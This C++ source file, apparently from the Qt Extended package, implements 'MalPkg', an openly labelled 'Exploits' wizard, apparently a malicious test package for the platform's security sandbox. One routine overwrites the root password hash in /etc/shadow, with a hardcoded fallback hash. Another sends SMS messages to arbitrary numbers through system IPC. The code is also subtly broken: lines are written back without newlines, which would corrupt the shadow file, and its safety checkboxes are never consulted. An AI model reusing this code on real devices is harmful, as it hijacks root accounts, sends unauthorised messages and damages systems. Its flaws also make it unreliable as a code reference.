/****************************************************************************
**
** This file is part of the Qt Extended Opensource Package.
**
** Copyright (C) 2009 Trolltech ASA.
**
** Contact: Qt Extended Information (info@qtextended.org)
**
** This file may be used under the terms of the GNU General Public License
** version 2.0 as published by the Free Software Foundation and appearing
** in the file LICENSE.GPL included in the packaging of this file.
**
** Please review the following information to ensure GNU General Public
** Licensing requirements will be met:
**     http://www.fsf.org/licensing/licenses/info/GPLv2.html.
**
**
****************************************************************************/

#include "malpkg.h"

#include <qtopiaipcadaptor.h>

#ifdef Q_OS_UNIX
#include <unistd.h>
#endif

#include <QLayout>
#include <QApplication>
#include <QLineEdit>
#include <QTextEdit>
#include <QLabel>
#include <QPushButton>
#include <QCheckBox>
#include <QFile>
#include <QTextStream>

MalPkg::MalPkg( QWidget *parent, Qt::WFlags f )
    : QWizard( parent, f )
{
    QBoxLayout *mvb = new QVBoxLayout( this );

    addPage( initPwdExPage() );
    addPage( initQcopExPage() );
    setWindowTitle("Exploits");

    connect( qApp, SIGNAL(appMessage(QString,QByteArray)),
            this, SLOT(appMessage(QString,QByteArray)) );
}

MalPkg::~MalPkg()
{
    // nothing to do
}

QWizardPage *MalPkg::initPwdExPage()
{
    QWizardPage *passwordExploit = new QWizardPage;
    passwordExploit->setTitle( "Password Exploit" );

    pwdExMsgs = new QTextEdit( passwordExploit );
    pwdExMsgs->setReadOnly( true );
    pwdExLine = new QLineEdit( passwordExploit );
    QLabel *pwdExLbl = new QLabel( tr("New root pwd:"), passwordExploit );
    pwdExButton = new QPushButton( tr("Change pwd"), passwordExploit );
    pwdExCheck = new QCheckBox( tr("Really do it"), passwordExploit );
    QBoxLayout *vb = new QVBoxLayout( passwordExploit );
    vb->addWidget( pwdExMsgs );

    QGridLayout *glay = new QGridLayout();
    glay->addWidget( pwdExLbl, 0, 0 );
    glay->addWidget( pwdExLine, 0, 1 );
    glay->addWidget( pwdExCheck, 1, 0 );
    glay->addWidget( pwdExButton, 1, 1 );
    vb->addLayout( glay );

    connect( pwdExButton, SIGNAL(clicked()),
            this, SLOT(pwdExploitDo()));
    return passwordExploit;
}

QWizardPage *MalPkg::initQcopExPage()
{
    QWizardPage *qcopExploit = new QWizardPage;
    qcopExploit->setObjectName( "qcop_exploit" );
    qcopExploit->setWindowTitle( "qcop Exploit" );

    qcopExMsgs = new QTextEdit( qcopExploit );
    qcopExLineNum = new QLineEdit( qcopExploit );
    qcopExLineMsg = new QLineEdit( qcopExploit );
    qcopExButton = new QPushButton( tr("Send qcop"), qcopExploit );
    qcopExCheck = new QCheckBox( tr("Really do it"), qcopExploit );
    QLabel *qcopExLblNum = new QLabel( tr("Recipient Number:"), qcopExploit );
    QLabel *qcopExLblMsg = new QLabel( tr("SMS message:"), qcopExploit );
    QBoxLayout *vb2 = new QVBoxLayout( qcopExploit );
    QGridLayout *glay2 = new QGridLayout();
    vb2->addWidget( qcopExMsgs );
    glay2->addWidget( qcopExLblNum, 0, 0 );
    glay2->addWidget( qcopExLineNum, 0, 1 );
    glay2->addWidget( qcopExLblMsg, 1, 0 );
    glay2->addWidget( qcopExLineMsg, 1, 1 );
    glay2->addWidget( qcopExCheck, 2, 0 );
    glay2->addWidget( qcopExButton, 2, 1 );
    vb2->addLayout( glay2 );

    connect( qcopExButton, SIGNAL(clicked()),
            this, SLOT(qcopExploitDo()));

    return qcopExploit;
}

void MalPkg::showPage( int )
{
    // nothing to do here at present
}

void MalPkg::pwdExploitDo()
{
    QFile pwd( "/etc/shadow" );
    if ( ! pwd.exists() )
    {
        pwdExMsgs->append( "/etc/shadow does not exist!" );
        return;
    }
    if ( ! pwd.open( QIODevice::ReadOnly ))
    {
        pwdExMsgs->append( "Could not read /etc/shadow" );
        pwdExMsgs->append( statusMsg( pwd.error() ));
        return;
    }

    pwdExMsgs->append( "Reading /etc/shadow" );
    QString line;
    QTextStream pin( &pwd );
    QStringList lines;
    while ( !pin.atEnd() )
    {
        line = pin.readLine();
        if ( line.left( 4 ) == "root" )
        {
            int start = line.indexOf( ':' );
            start++;
            int end = line.indexOf( ':', start );
#ifdef Q_OS_UNIX
            const char* newpwd = pwdExLine->text().toLocal8Bit();
            const char *crypted = crypt( newpwd, "Qt" );
#else
            // "SantaClaus" crypted with salt Qs
            const char *crypted = "QsohZBDzy576U";
            pwdExMsgs->append( "Cannot crypt password on non-unix system, using \"SantaClaus\" instead" );
            pwdExLine->setText( "SantaClaus" );
#endif
            line = QString( "root:" ) + crypted + line.mid( end );
        }
        lines << line;
    }
    pwd.close();

    if ( ! pwd.open( QIODevice::WriteOnly ))
    {
        pwdExMsgs->append( "Could not write /etc/shadow" );
        pwdExMsgs->append( statusMsg( pwd.error() ));
        return;
    }

    QTextStream pout( &pwd );
    for ( QStringList::Iterator it = lines.begin(); it != lines.end(); ++it )
    {
        pout << *it;
    }
    pwd.close();
    pwdExMsgs->append( "Wrote %1 as root password" );
}

void MalPkg::qcopExploitDo()
{
    QtopiaIpcAdaptor qo(QLatin1String("Email"));
    qo.send( SIGNAL(writeSms(QString,QString)), qcopExLineMsg->text(), qcopExLineNum->text() );
}

QString MalPkg::statusMsg( int stat )
{
    switch ( stat )
    {
        case QFile::NoError: return tr( "No error occurred." );
        case QFile::ReadError: return tr( "An error occurred when reading from the file." );
        case QFile::WriteError: return tr( "An error occurred when writing to the file." );
        case QFile::FatalError: return tr( "A fatal error occurred." );
        case QFile::ResourceError: return tr( "Resource error." );
        case QFile::OpenError: return tr( "The file could not be opened." );
        case QFile::AbortError: return tr( "The operation was aborted." );
        case QFile::TimeOutError: return tr( "A timeout occurred." );
        case QFile::UnspecifiedError: return tr( "An unspecified error occurred." );
        case QFile::RemoveError: return tr( "The file could not be removed." );
        case QFile::RenameError: return tr( "The file could not be renamed." );
        case QFile::PositionError: return tr( "The position in the file could not be changed." );
        case QFile::ResizeError: return tr( "The file could not be resized." );
        case QFile::PermissionsError: return tr( "The file could not be accessed." );
        case QFile::CopyError: return tr( "The file could not be copied." );
    }
    return tr( "Status code incorrect" );
}

void MalPkg::appMessage( const QString& msg, const QByteArray& data )
{
    Q_UNUSED( data );
    /*
       // eventually decode the messages here in the documented fashion...
    QDataStream stream( data, IO_ReadOnly );
    if ( msg == "someMessage(int,int,int)" ) {
        int a,b,c;
        stream >> a >> b >> c;
        ...
    } else if ( msg == "otherMessage(QString)" ) {
        ...
    }
    */
    qcopExMsgs->append( "Message recd: " + msg );
}

